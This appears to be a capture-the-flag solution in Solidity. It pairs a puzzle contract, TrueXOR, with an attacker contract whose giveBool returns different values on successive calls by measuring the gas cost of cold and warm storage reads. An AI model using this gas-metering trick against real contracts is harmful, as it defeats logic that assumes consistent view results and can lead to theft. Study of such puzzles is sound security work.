// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

interface IBoolGiver {
  function giveBool() external view returns (bool);
}

contract TrueXOR {
  function callMe(address target) external view returns (bool) {
    bool p = IBoolGiver(target).giveBool();
    bool q = IBoolGiver(target).giveBool();
    require((p && q) != (p || q), "bad bools");
    require(msg.sender == tx.origin, "bad sender");
    return true;
  }
}

contract Attacker_TrueXOR {
    uint num;
    function giveBool() public returns(bool){
        uint gasleft_before = gasleft();
        uint temp = num;
        uint gasleft_after = gasleft();
        if (gasleft_before - gasleft_after >2000)
        {
            return true;
        }
        return false;
    } 
}
